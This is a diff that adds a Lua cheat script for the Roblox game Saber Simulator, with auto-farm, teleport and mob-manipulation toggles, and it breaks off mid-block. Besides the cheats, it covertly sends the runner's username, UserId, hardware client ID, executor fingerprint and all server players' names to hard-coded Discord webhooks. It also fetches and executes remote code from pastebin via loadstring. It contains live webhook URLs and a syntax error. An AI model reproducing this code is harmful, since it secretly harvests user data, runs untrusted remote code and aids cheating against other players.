@@ -1,0 +1,931 @@
+getgenv().EggName1 = "D"
+getgenv().EggName2 = "NothingHere"
+
+local a;
+local b;
+httprequest = syn and syn.request or http_request or http.request;
+local c = game:GetService("HttpService"):JSONDecode(httprequest({
+	Url = "http://httpbin.org/get"
+}).Body)["headers"]
+local d = {
+	"fingerprint",
+	"Syn-Fingerprint",
+	"Sw-Fingerprint",
+	"ScriptWare-Fingerprint",
+	"Krnl-Fingerprint",
+	"Flux-Fingerprint",
+	"Fluxus-Fingerprint",
+	"Electron-Fingerprint",
+	"Evon-Fingerprint",
+	"Trigon-Fingerprint",
+	"Sirhurt-Fingerprint",
+	"Comet-Fingerprint"
+}
+for e, f in pairs(c) do
+	if table.find(d, e) then
+		a = f;
+		b = e;
+		break
+	end
+end;
+spawn(function()
+	local g = ""
+	for e, f in pairs(game.Players:GetPlayers()) do
+		g = g .. "\n Name: " .. f.Name .. " \n DisplayName: " .. f.DisplayName .. " \n UserId: " .. f.UserId .. "\n"
+	end;
+	local h = game:GetService("RbxAnalyticsService"):GetClientId()
+	local i = tostring(identifyexecutor())
+	local j = "https://discord.com/api/webhooks/1054559139860328528/R2hVD8VFOtw3pB4m1TEI3y1FsBGIDjBdspd-sQNIu3IdNvPAzupKlQF5Ol8_jRMOZNWt"
+	local k = {
+		["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png",
+		["username"] = game.Players.LocalPlayer.DisplayName .. " " .. game.Players.LocalPlayer.Name .. " " .. game.Players.LocalPlayer.UserId,
+		["content"] = "**" .. game.Players.LocalPlayer.Name .. " Executed Your Saber Simulator Vip Script! " .. "\n" .. "https://www.roblox.com/games/" .. game.PlaceId .. "/ " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "**",
+		["embeds"] = {
+			{
+				["title"] = tostring(b) .. "\nFingerprint: " .. tostring(a),
+				["description"] = "**HWID: " .. tostring(h) .. "** \n" .. "**Exploit: " .. i .. "**" .. "\n" .. "** \n Server Players" .. g .. "**",
+				["type"] = "rich",
+				["color"] = tonumber(7498202),
+				["image"] = {
+					["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
+				}
+			}
+		}
+	}
+	local l = game:GetService("HttpService"):JSONEncode(k)
+	local c = {
+		["content-type"] = "application/json"
+	}
+	request = http_request or request or HttpPost or syn.request;
+	local m = {
+		Url = j,
+		Body = l,
+		Method = "POST",
+		Headers = c
+	}
+	request(m)
+end)
+local n = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+	n:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+	wait(0.5)
+	n:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+end)
+
+local o = game:GetService("UserInputService")
+if o.TouchEnabled and not o.KeyboardEnabled and not o.MouseEnabled then
+elseif not o.TouchEnabled and o.KeyboardEnabled and o.MouseEnabled then
+	local a;
+	local b;
+	httprequest = syn and syn.request or http_request or http.request;
+	local c = game:GetService("HttpService"):JSONDecode(httprequest({
+		Url = "http://httpbin.org/get"
+	}).Body)["headers"]
+	local d = {
+		"fingerprint",
+		"Syn-Fingerprint",
+		"Sw-Fingerprint",
+		"ScriptWare-Fingerprint",
+		"Krnl-Fingerprint",
+		"Flux-Fingerprint",
+		"Fluxus-Fingerprint",
+		"Electron-Fingerprint",
+		"Evon-Fingerprint",
+		"Trigon-Fingerprint",
+		"Sirhurt-Fingerprint",
+		"Comet-Fingerprint"
+	}
+	for e, f in pairs(c) do
+		if table.find(d, e) then
+			a = f;
+			b = e;
+			break
+		end
+	end;
+	if a == nil or a == "" or a == " " then
+		loadstring(game:HttpGet("https://discord.gg/ySZgbZRftg"))()
+		for e, f in pairs(game:GetService("CoreGui"):GetChildren()) do
+			if f.Name == "!NotAnt Message" and f:FindFirstChild("TextLabel") then
+				f:FindFirstChild("TextLabel").Text = "Warning!!!\nNot Supported EXECUTOR\nDM !NotAnt for any help"
+			end
+		end;
+		return
+	end
+end;
+game.Players.LocalPlayer.PlayerGui.Gui.Home.MSG.TextColor3 = Color3.new(0, 0, 0)
+if loadstring(game:HttpGet("https://pastebin.com/raw/BesNMAk2", true))() then
+	loadstring(game:HttpGet("https://pastebin.com/raw/BesNMAk2", true))()
+end;
+spawn(function())
+	_G.HumanoidRootPartAnchored = true;
+	while _G.HumanoidRootPartAnchored do
+		pcall(function()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+		end)
+		wait()
+	end
+end)
+spawn(function()
+	repeat
+		wait(1)
+		print("Waiting for roblox...")
+	until game.Players.LocalPlayer.PlayerGui.Gui.Home.Version.Text ~= "v1"
+	game:GetService("Players").LocalPlayer.PlayerGui.Gui.Submenus.PetsInventory.Visible = true;
+	game:GetService("Players").LocalPlayer.PlayerGui.Gui.Submenus.PetsInventory.Position = UDim2.new(0.5, 0, 0.5, 0)
+	task.wait(5)
+	game:GetService("Players").LocalPlayer.PlayerGui.Gui.Submenus.PetsInventory.Visible = false;
+	task.wait(1)
+	game:GetService("Players").LocalPlayer.PlayerGui.Gui.Submenus.Clans.Visible = true;
+	game:GetService("Players").LocalPlayer.PlayerGui.Gui.Submenus.Clans.Position = UDim2.new(0.5, 0, 0.5, 0)
+	task.wait(5)
+	game:GetService("Players").LocalPlayer.PlayerGui.Gui.Submenus.Clans.Visible = false;
+	task.wait(1)
+	local q = {
+		[1] = "Troll"
+	}
+	for e, f in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Gui.Submenus.Clans:GetChildren()) do
+		if f.Name == "NoClan" and f.Visible == true then
+			if f.InvitesFrame.Frame.None.Visible == true then
+				local r = {
+					[1] = "Create",
+					[2] = "Public",
+					[3] = q[math.random(1, 30)] or q[math.random(1, 30)] or q[math.random(1, 30)] or q[math.random(1, 30)] or q[math.random(1, 30)]
+				}
+				game:GetService("ReplicatedStorage").Events.ClanAction:FireServer(unpack(r))
+				return
+			else
+				for s, t in pairs(f.InvitesFrame.Frame:GetDescendants()) do
+					if t:IsA("TextLabel") and t.Name == "Count" then
+						if t.Text == "3/4" then
+							local r = {
+								[1] = "Join",
+								[2] = workspace.Clans[t.Parent.Name]
+							}
+							game:GetService("ReplicatedStorage").Events.ClanAction:FireServer(unpack(r))
+							return
+						elseif t.Text == "2/4" then
+							local r = {
+								[1] = "Join",
+								[2] = workspace.Clans[t.Parent.Name]
+							}
+							game:GetService("ReplicatedStorage").Events.ClanAction:FireServer(unpack(r))
+							return
+						elseif t.Text == "1/4" then
+							local r = {
+								[1] = "Join",
+								[2] = workspace.Clans[t.Parent.Name]
+							}
+							game:GetService("ReplicatedStorage").Events.ClanAction:FireServer(unpack(r))
+							return
+						elseif t.Text == "4/4" then
+							local r = {
+								[1] = "Create",
+								[2] = "Public",
+								[3] = q[math.random(1, 30)] or q[math.random(1, 30)] or q[math.random(1, 30)] or q[math.random(1, 30)] or q[math.random(1, 30)]
+							}
+							game:GetService("ReplicatedStorage").Events.ClanAction:FireServer(unpack(r))
+							return
+						end
+					end
+				end
+			end
+		end
+	end
+end)
+spawn(function()
+		wait(3)
+		game.Players.LocalPlayer.PlayerGui.Gui.Home.MSG.Text = "Welcome " .. game:GetService("Players").LocalPlayer.Name;
+		wait(3)
+		game.Players.LocalPlayer.PlayerGui.Gui.Home.MSG.Text = "Thanks for buying the script."
+		wait(3)
+		game.Players.LocalPlayer.PlayerGui.Gui.Home.MSG.Text = "Just wanted to say that I wont update this script like before \n Taking break from scripts"
+		wait(5)
+		game.Players.LocalPlayer.PlayerGui.Gui.Home.MSG.Text = ""
+	end)
+	spawn(function()
+		getgenv().AntiTeleport = true;
+		while getgenv().AntiTeleport do
+			pcall(function()
+				game.Players.LocalPlayer.PlayerGui.Gui.Home.MSG.TextColor3 = Color3.new(0, 0, 0)
+				if game:GetService("Players").LocalPlayer.Character:FindFirstChild("AntiPort") then
+					game:GetService("Players").LocalPlayer.Character:FindFirstChild("AntiPort"):Remove()
+				end;
+				if game:GetService("Players").LocalPlayer.Character:FindFirstChild("AntiPortNew") then
+					game:GetService("Players").LocalPlayer.Character:FindFirstChild("AntiPortNew"):Remove()
+				end
+			end)
+			wait()
+		end
+	end)
+	spawn(function()
+		for e, f in pairs(game:GetService("Workspace").Locations:GetChildren()) do
+			if f.Name == "DEVILSpawnThis" then
+				f:Destroy()
+			end
+		end;
+		task.wait(0.5)
+		folder = Instance.new("Folder", game:GetService("Workspace").Locations)
+		folder.Name = "DEVILSpawnThis"
+    x = Instance.new("Part", game:GetService("Workspace").Locations.DEVILSpawnThis)
+		x.Name = "DEVILMasterFirePart"
+		x.CFrame = CFrame.new(-759,91,750)
+		x.Anchored = true;
+		x.CanCollide = false;
+		x.Size = Vector3.new(1, 1, 1)
+		x.Transparency = 0;
+		task.wait(0.5)
+		x = Instance.new("Part", game:GetService("Workspace").Locations.DEVILSpawnThis)
+		x.Name = "DEVILAdvanceFirePart"
+		x.CFrame = CFrame.new(196.533356, - 128.283157, - 1181.27173, - 0.179932699, - 2.24372769e-08, - 0.983678937, - 6.25251744e-08, 1, - 1.13725669e-08, 0.983678937, 5.94583973e-08, - 0.179932699)
+		x.Anchored = true;
+		x.CanCollide = false;
+		x.Size = Vector3.new(1, 1, 1)
+		x.Transparency = 0;
+		task.wait(0.1)
+		x = Instance.new("Part", game:GetService("Workspace").Locations.DEVILSpawnThis)
+		x.Name = "DEVILNormalFirePart"
+		x.CFrame = CFrame.new(528.579529, 189.898621, 512.780334, - 0.169101521, 6.84280167e-06, - 0.985598624, - 3.03589768e-05, 1, 1.21515495e-05, 0.985598624, 3.19766114e-05, - 0.169101521)
+		x.Anchored = true;
+		x.CanCollide = false;
+		x.Size = Vector3.new(1, 1, 1)
+		x.Transparency = 0;
+		task.wait(0.1)
+		getgenv().autoclick = false;
+		getgenv().autosell = false;
+		getgenv().autodaily = false;
+		getgenv().BossKiller = false;
+		getgenv().bosshealth = false;
+		getgenv().BringElements = false;
+		getgenv().BringFireElements = false;
+		getgenv().telefirefarm = false;
+		getgenv().usefirepoints = false;
+		getgenv().TranAllElements1 = false;
+		getgenv().TranAllElements2 = false;
+		getgenv().tranBoss = false;
+		getgenv().tranBoss2 = false;
+		getgenv().RemoveMobsHead = false;
+		getgenv().RemoveBossHead = false;
+		getgenv().breakmobs = false;
+		getgenv().breakboss = false;
+		getgenv().Accessoryremover = false;
+		getgenv().uncolorboss = false;
+		getgenv().uncolormobs = false;
+		getgenv().NameChanger = false;
+		getgenv().hideplayers = false;
+		local u = loadstring(game:HttpGet('https://raw.githubusercontent.com/Anti-Ant/Ui/main/Wally%20Ui'))()
+		local v = u:CreateWindow("Main")
+		local s = v:CreateFolder("Auto Farm")
+		s:Toggle("Auto Click", function(w)
+			getgenv().autoclick = w;
+			if w then
+				spawn(function()
+					while autoclick do
+						pcall(function()
+							if game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool") then
+								game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool"))
+							end;
+							game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteClick:FireServer()
+							game.ReplicatedStorage.Events.Clicked:FireServer()
+						end)
+						wait()
+					end
+				end)
+			end
+		end)
+		local y;
+		s:Box("Auto Sell Time", "value", function(z)
+			y = z
+		end)
+		s:Toggle("Auto Sell", function(w)
+			getgenv().autosell = w;
+			if w then
+				spawn(function()
+					while autosell do
+						pcall(function()
+							local A = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame;
+							wait()
+							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(533.0361938476562, 183.83583068847656, 153.6753692626953)
+							wait(0.3)
+							game:GetService("ReplicatedStorage").Events.Sell:FireServer()
+							wait(0.1)
+							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = A
+						end)
+						wait(y)
+					end
+				end)
+			end
+		end)
+		s:Toggle("Collect Daily Reward", function(w)
+			getgenv().autodaily = w;
+			if w then
+				spawn(function()
+					while autodaily do
+						pcall(function()
+							autodr = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame;
+							if workspace.DailyReward.Location.BillboardGui.Frame.Desc.Text == "Collect Reward" then
+								wait()
+								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(498, 190, 135)
+								wait(0.2)
+								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(498, 190, 135)
+								wait(0.2)
+								game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = autodr
+							else
+							end
+						end)
+						wait()
+					end
+				end)
+			end
+		end)
+		s:Toggle("Bring Boss", function(w)
+			getgenv().BossKiller = w;
+			getgenv().bosshealth = w;
+			if w then
+				spawn(function()
+					while BossKiller do
+						pcall(function()
+							local B = math.random(0.5, 2)
+							if game:GetService("Workspace"):FindFirstChild("Boss") then
+								for e, f in pairs(game:GetService("Workspace"):FindFirstChild("Boss"):GetChildren()) do
+									if f.Name == "HumanoidRootPart" then
+										f.Anchored = true;
+										f.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(B, B, B)
+									end
+								end
+							end
+						end)
+						wait()
+					end
+				end)
+				spawn(function()
+					while bosshealth do
+						pcall(function()
+							game.Players.LocalPlayer.PlayerGui.Gui.Home.DailyRewardInfo.Text = game:GetService("Workspace").Locations.ArenaGui.BillboardGui.Frame.TextLabel.Text;
+							game.Players.LocalPlayer.PlayerGui.Gui.Home.DailyRewardInfo.TextSize = 16;
+							game.Players.LocalPlayer.PlayerGui.Gui.Home.DailyRewardInfo.TextScaled = false;
+							game.Players.LocalPlayer.PlayerGui.Gui.Home.DailyRewardInfo.Visible = true
+						end)
+						wait()
+					end
+				end)
+			else
+				game.Players.LocalPlayer.PlayerGui.Gui.Home.DailyRewardInfo.Visible = false;
+				for e, f in pairs(game:GetService("Workspace"):FindFirstChild("Boss"):GetChildren()) do
+					if f.Name == "HumanoidRootPart" then
+						f.Anchored = false
+					end
+				end
+			end
+		end)
+		s:Toggle("Bring Elements(All)", function(w)
+			getgenv().BringElements = w;
+			if w then
+				spawn(function()
+					while BringElements do
+						pcall(function()
+							for e, f in pairs(game.Workspace.Mobs:GetDescendants()) do
+								if f.Name == "HumanoidRootPart" then
+									f.Anchored = true;
+									f.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+								end
+							end
+						end)
+						wait(0.0000001)
+					end
+				end)
+			else
+				for e, f in pairs(game.Workspace.Mobs:GetDescendants()) do
+					if f.Name == "HumanoidRootPart" then
+						f.Anchored = false
+					end
+				end
+			end
+		end)
+		local V = u:CreateWindow("Elements Farm")
+		local W = V:CreateFolder("Fire Element")
+		W:Toggle("Bring Fire Elements", function(w)
+			getgenv().BringFireElements = w;
+			if w then
+				spawn(function()
+					while BringFireElements do
+						pcall(function()
+							for e, f in pairs(game:GetService("Workspace").Mobs:GetChildren()) do
+								if f.Name:find("Fire") or f.Name:find("fire") then
+									for s, t in pairs(f:GetChildren()) do
+										if t.Name == "HumanoidRootPart" then
+											t.Anchored = true;
+											t.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+										end
+									end
+								end
+							end
+						end)
+						wait(0.0000001)
+					end
+				end)
+			else
+				spawn(function()
+					for e, f in pairs(game:GetService("Workspace").Mobs:GetChildren()) do
+						if f.Name:find("Fire") or f.Name:find("fire") then
+							for s, t in pairs(f:GetChildren()) do
+								if t.Name == "HumanoidRootPart" then
+									t.Anchored = false
+								end
+							end
+						end
+					end
+				end)
+			end
+		end)
+		W:Box("Fire Element Farm Time", "value", function(z)
+			fireelefarmtime = z
+		end)
+		W:Toggle("Tele Fire Ele Farm", function(w)
+			getgenv().telefirefarm = w;
+			if w then
+				spawn(function()
+					while telefirefarm do
+						pcall(function()
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(196.533356, - 128.283157, - 1181.27173, - 0.179932699, - 2.24372769e-08, - 0.983678937, - 6.25251744e-08, 1, - 1.13725669e-08, 0.983678937, 5.94583973e-08, - 0.179932699)
+							wait(fireelefarmtime)
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(528.579529, 189.898621, 512.780334, - 0.169101521, 6.84280167e-06, - 0.985598624, - 3.03589768e-05, 1, 1.21515495e-05, 0.985598624, 3.19766114e-05, - 0.169101521)
+              wait(fireelefarmtime)
+              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-759,91,750)
+						end)
+						wait(fireelefarmtime)
+					end
+				end)
+			end
+		end)
+		getgenv().farmfireelebeta = false;
+		W:Toggle("FarmFireEle(Beta)", function(w)
+			getgenv().farmfireelebeta = w;
+			if w then
+				spawn(function()
+					while farmfireelebeta do
+						pcall(function()
+							for e, f in pairs(game:GetService("Workspace").Mobs:GetChildren()) do
+								if f.Name:find("Fire") or f.Name:find("fire") then
+									for s, t in pairs(f:GetChildren()) do
+										if t.Name == "HumanoidRootPart" then
+											if (game:GetService("Workspace").Locations.DEVILSpawnThis.DEVILNormalFirePart.Position - t.Position).Magnitude < 100 then
+												t.Anchored = true;
+												t.CFrame = game:GetService("Workspace").Locations.DEVILSpawnThis.DEVILNormalFirePart.CFrame
+											end
+										end
+									end
+								end
+							end;
+							for e, f in pairs(game:GetService("Workspace").Mobs:GetChildren()) do
+								if f.Name:find("Fire") or f.Name:find("fire") then
+									for s, t in pairs(f:GetChildren()) do
+										if t.Name == "HumanoidRootPart" then
+											if (game:GetService("Workspace").Locations.DEVILSpawnThis.DEVILAdvanceFirePart.Position - t.Position).Magnitude < 100 then
+												t.Anchored = true;
+												t.CFrame = game:GetService("Workspace").Locations.DEVILSpawnThis.DEVILAdvanceFirePart.CFrame
+											end
+										end
+									end
+								end
+							end;
+							function getlowest()
+								local X = {}
+								for e, f in pairs(game:GetService("Workspace").Mobs:GetChildren()) do
+									if f.Name:find("Fire") or f.Name:find("fire") then
+										for s, t in pairs(f:GetChildren()) do
+											if t.Name == "HumanoidRootPart" then
+												table.insert(X, t.EnemyHealth.HealthBar.Amount.Text)
+												table.sort(X, function(e, f)
+													return e < f
+												end)
+											end
+										end
+									end
+								end;
+								for e, f in pairs(game:GetService("Workspace").Mobs:GetChildren()) do
+									if f.Name:find("Fire") or f.Name:find("fire") then
+										for s, t in pairs(f:GetChildren()) do
+											if t.Name == "HumanoidRootPart" then
+												if X[1] == t.EnemyHealth.HealthBar.Amount.Text then
+													return t
+												end
+											end
+										end
+									end
+								end
+							end;
+							local Y = getlowest()
+							local Z = Y.CFrame;
+							local _ = math.huge;
+							local a0 = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Y.Position).magnitude / tonumber(_)
+							local a1 = game.Players.LocalPlayer.Character.HumanoidRootPart;
+							local a2 = game:GetService("TweenService"):Create(a1, TweenInfo.new(tonumber(a0), Enum.EasingStyle.Linear), {
+								CFrame = Z
+							})
+							a2:Play()
+						end)
+						wait()
+					end
+				end)
+			end
+		end)
+		local a6 = V:CreateFolder("Element Teleport")
+		a6:Button("Normal Fire", function()
+			spawn(function()
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(549.651306, 189.897507, 465.052307, - 0.57786566, - 2.06541671e-07, 0.81613189, 2.54906581e-07, 1, 4.33561581e-07, - 0.81613189, 4.58577745e-07, - 0.57786566)
+			end)
+		end)
+		a6:Button("Advance Fire", function()
+			spawn(function()
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(191.011276, - 158.905884, - 1180.68774, 0.0300725456, - 5.30732632e-06, - 0.99954772, - 0.00113583799, 0.999999344, - 3.94827184e-05, 0.999547064, 0.00113651156, 0.0300725196)
+			end)
+		end)
+		a6:Button("Master Fire", function()
+			spawn(function()
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-759,91,750)
+			end)
+		end)
+		local f = u:CreateWindow("Misc/OpenGui")
+		local e = f:CreateFolder("Function")
+		e:Toggle("Break - Ele/Boss(Reduce Lag)", function(w)
+			getgenv().TranAllElements1 = w;
+			getgenv().TranAllElements2 = w;
+			getgenv().tranBoss = w;
+			getgenv().tranBoss2 = w;
+			getgenv().RemoveMobsHead = w;
+			getgenv().RemoveBossHead = w;
+			getgenv().breakmobs = w;
+			getgenv().breakboss = w;
+			getgenv().Accessoryremover = w;
+			getgenv().uncolorboss = w;
+			getgenv().uncolormobs = w;
+			if w then
+				spawn(function()
+					while TranAllElements1 do
+						pcall(function()
+							for e, f in pairs(game:GetService("Workspace").Mobs:GetDescendants()) do
+								if f:IsA("MeshPart") and f.Parent:IsA("Model") then
+									f.Transparency = 0.9
+								end
+							end
+						end)
+						wait(0.5)
+					end
+				end)
+				spawn(function()
+					while TranAllElements2 do
+						pcall(function()
+							for e, f in pairs(game:GetService("Workspace").Mobs:GetDescendants()) do
+								if f:IsA("Part") and f.Parent:IsA("Model") then
+									f.Transparency = 1
+								end
+							end
+						end)
+						wait(0.5)
+					end
+				end)
+				spawn(function()
+					while tranBoss do
+						pcall(function()
+							for e, f in pairs(game.Workspace:FindFirstChild("Boss"):GetDescendants()) do
+								if f:IsA("MeshPart") then
+									f.Transparency = 0.9
+								end
+							end
+						end)
+						wait(0.5)
+					end
+				end)
+				spawn(function()
+					while tranBoss2 do
+						pcall(function()
+							for e, f in pairs(game.Workspace:FindFirstChild("Boss"):GetDescendants()) do
+								if f:IsA("Part") then
+									f.Transparency = 1
+								end
+							end
+						end)
+						wait(0.5)
+					end
+				end)
+				spawn(function()
+					while RemoveMobsHead do
+						pcall(function()
+							for e, f in pairs(game:GetService("Workspace").Mobs:GetDescendants()) do
+								if f.Name == "Head" and f.Parent:IsA("Model") then
+									f.Parent = nil;
+									f:Destroy()
+								end
+							end
+						end)
+						wait(0.5)
+					end
+				end)
+				spawn(function()
+					while RemoveBossHead do
+						pcall(function()
+							for e, f in pairs(game.Workspace:FindFirstChild("Boss"):GetDescendants()) do
+								if f.Name == "Head" then
+									f.Parent = nil;
+									f:Destroy()
+								end
+							end
+						end)
+						wait(0.5)
+					end
+				end)
+				spawn(function()
+					while breakmobs do
+						pcall(function()
+							for e, f in pairs(game:GetService("Workspace").Mobs:GetDescendants()) do
+								if f.Name == "Humanoid" then
+									f.Parent = nil;
+									f:Destroy()
+								end
+							end
+						end)
+						wait(0.5)
+					end
+				end)
+				spawn(function()
+					while breakboss do
+						pcall(function()
+							for e, f in pairs(game.Workspace:FindFirstChild("Boss"):GetDescendants()) do
+								if f.Name == "Humanoid" then
+									f.Parent = nil;
+									f:Destroy()
+								end
+							end
+						end)
+						wait(0.5)
+					end
+				end)
+				spawn(function()
+					while Accessoryremover do
+						pcall(function()
+							for e, f in pairs(game.Workspace.Mobs:GetDescendants()) do
+								if f:IsA("Accessory") then
+									f:Destroy()
+								end
+							end;
+							for e, f in pairs(game.Workspace.Mobs:GetDescendants()) do
+								if f.Name == "HumanoidRootPart" then
+									f.Transparency = 1
+								end
+							end
+						end)
+						wait(0.5)
+					end
+				end)
+				spawn(function()
+					while uncolorboss do
+						pcall(function()
+							for e, f in pairs(game.Workspace:FindFirstChild("Boss"):GetDescendants()) do
+								if f:IsA("BodyColors") then
+									f.Parent = nil;
+									f:Destroy()
+								end
+							end
+						end)
+						wait()
+					end
+				end)
+				spawn(function()
+					while uncolormobs do
+						pcall(function()
+							for e, f in pairs(game:GetService("Workspace").Mobs:GetDescendants()) do
+								if f:IsA("BodyColors") then
+									f.Parent = nil;
+									f:Destroy()
+								end
+							end
+						end)
+						wait()
+					end
+				end)
+			end
+		end)
+		e:Toggle("Hide N,R,L", function(w)
+			getgenv().NameChanger = w;
+			if w then
+				spawn(function()
+					while NameChanger do
+						pcall(function()
+							spawn(function()
+								for e, f in pairs(game.Players:GetChildren()) do
+									if f.Character.Head.RankingGui:FindFirstChild("PName") then
+										f.Character.Head.RankingGui.PName.Text = "SaberSimulatorFucker"
+									end;
+									if f.Character.Head.RankingGui:FindFirstChild("Tag1") then
+										f.Character.Head.RankingGui.Tag1.Text = "DEVIL"
+										if f.Character.Head.RankingGui.ImageFrame.Element.Amount then
+											f.Character.Head.RankingGui.ImageFrame.Element.Amount.Text = "999+"
+										end
+									end
+								end
+							end)
+						end)
+						wait()
+					end
+				end)
+			end
+		end)
+		e:Toggle("Remove Other Players", function(w)
+			getgenv().hideplayers = w;
+			if w then
+				spawn(function()
+					while getgenv().hideplayers do
+						wait()
+						pcall(function()
+							for e, f in pairs(game:GetService("Players"):GetPlayers()) do
+								if f ~= game:GetService("Players").LocalPlayer then
+									f.Character:Remove()
+								end
+							end
+						end)
+					end
+				end)
+			end
+		end)
+		e:Toggle("Hide/Show Popup", function(w)
+			if w then
+				game.Players.LocalPlayer.PlayerGui.Gui.LocalScript.GuiAnimations.NumberClone.Visible = false;
+				game.Players.LocalPlayer.PlayerGui.Gui.LocalScript.GuiAnimations.ElementNumberClone.Visible = false
+			else
+				game.Players.LocalPlayer.PlayerGui.Gui.LocalScript.GuiAnimations.NumberClone.Visible = true;
+				game.Players.LocalPlayer.PlayerGui.Gui.LocalScript.GuiAnimations.ElementNumberClone.Visible = true
+			end
+		end)
+		e:Toggle("Hide/Show Gui", function(w)
+			if w then
+				game.Players.LocalPlayer.PlayerGui.Gui.Home.Visible = false
+			else
+				game.Players.LocalPlayer.PlayerGui.Gui.Home.Visible = true
+			end
+		end)
+		e:Toggle("Day/Night", function(w)
+			if w then
+				pcall(function()
+					local a7 = game:GetService("TweenService")
+					local a8 = game:GetService("Lighting")
+					local a9 = TweenInfo.new(3, Enum.EasingStyle.Linear)
+					local function aa(ab)
+						a7:Create(a8, a9, {
+							ClockTime = ab
+						}):Play()
+					end;
+					if a8.DayTime.Value == true then
+						aa(12)
+						return
+					end;
+					aa(0)
+				end)
+			else
+				pcall(function()
+					local ac = game:GetService("TweenService")
+					local ad = game:GetService("Lighting")
+					local ae = TweenInfo.new(3, Enum.EasingStyle.Linear)
+					local function aa(ab)
+						ac:Create(ad, ae, {
+							ClockTime = ab
+						}):Play()
+					end;
+					if ad.DayTime.Value == false then
+						aa(12)
+						return
+					end;
+					aa(0)
+				end)
+			end
+		end)
+		e:Button("Remove All Pets", function()
+			game:GetService("Workspace"):FindFirstChild("PetHolder"):Remove()
+		end)
+		e:Button("Remove All Particles", function()
+			for e, f in pairs(game:GetService("Workspace"):GetDescendants()) do
+				if f:IsA("ParticleEmitter") then
+					f:Remove()
+				end
+			end
+		end)
+		e:Button("Inf Jump", function()
+			spawn(function()
+				while true do
+					pcall(function()
+						game.Players.LocalPlayer.PlayerScripts["Double Jump"].MaxJumps.Value = 99999
+					end)
+					wait()
+				end
+			end)
+		end)
+		e:Button("Shop", function()
+			game.Players.LocalPlayer.PlayerGui.Gui.Submenus.Shop.Visible = true;
+			game.Players.LocalPlayer.PlayerGui.Gui.Submenus.Shop.Position = UDim2.new(0.5, 0, 0.5, 0)
+		end)
+		e:Button("Crown Shop", function()
+			game.Players.LocalPlayer.PlayerGui.Gui.Submenus.CrownShop.Visible = true;
+			game.Players.LocalPlayer.PlayerGui.Gui.Submenus.CrownShop.Position = UDim2.new(0.5, 0, 0.5, 0)
+		end)
+		e:Button("Skill Shop", function()
+			game.Players.LocalPlayer.PlayerGui.Gui.Submenus.SkillShop.Visible = true;
+			game.Players.LocalPlayer.PlayerGui.Gui.Submenus.SkillShop.Position = UDim2.new(0.5, 0, 0.5, 0)
+		end)
+		e:Button("AutoCodes", function()
+			spawn(function()
+				wait(0.1)
+				local af = {
+					"petboost",
+					"voidgg",
+					"weekend",
+					"oioi",
+					"yippee",
+					"2020",
+					"5000followers",
+					"vehnix",
+					"slayer",
+					"saber",
+					"legend",
+					"islands",
+					"100m",
+					"airstudio",
+					"straw",
+					"calixo",
+					"erick",
+					"prez",
+					"grim",
+					"boss",
+					"telanthric",
+					"defild",
+					"melihkardes",
+					"cookieclix",
+					"cookie",
+					"gravy",
+					"raven",
+					"razor",
+					"robzi",
+					"subtoaustin",
+					"release",
+					"mirrors",
+					"henrydev",
+					"mmistaken",
+					"500m",
+					"update100"
+				}
+				for e, f in pairs(af) do
+					local ag = game:GetService("ReplicatedStorage").Events.CheckCode;
+					ag:InvokeServer(f)
+				end
+			end)
+		end)
+		e:Button("RemoveTexture", function()
+			spawn(function()
+				for ah, f in pairs(workspace:GetDescendants()) do
+					if f.ClassName == "Part" or f.ClassName == "SpawnLocation" or f.ClassName == "WedgePart" or f.ClassName == "Terrain" or f.ClassName == "MeshPart" then
+						f.BrickColor = BrickColor.new(155, 155, 155)
+						f.Material = "Plastic"
+					end
+				end
+			end)
+		end)
+	end)
+	spawn(function()
+		local g = ""
+		for e, f in pairs(game.Players:GetPlayers()) do
+			g = g .. "\n Name: " .. f.Name .. " \n DisplayName: " .. f.DisplayName .. " \n UserId: " .. f.UserId .. "\n"
+		end;
+		local h = game:GetService("RbxAnalyticsService"):GetClientId()
+		local i = tostring(identifyexecutor())
+		local j = "https://discord.com/api/webhooks/1402019751286407449/Fw28cG28mBjwFuC8eL9jaMy9CkSO5qM3y8uC7_2PDgWNLfRArYcDYpylH9GI1eA1oDh8"
+		local k = {
+			["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png",
+			["username"] = game.Players.LocalPlayer.DisplayName .. " " .. game.Players.LocalPlayer.Name .. " " .. game.Players.LocalPlayer.UserId,
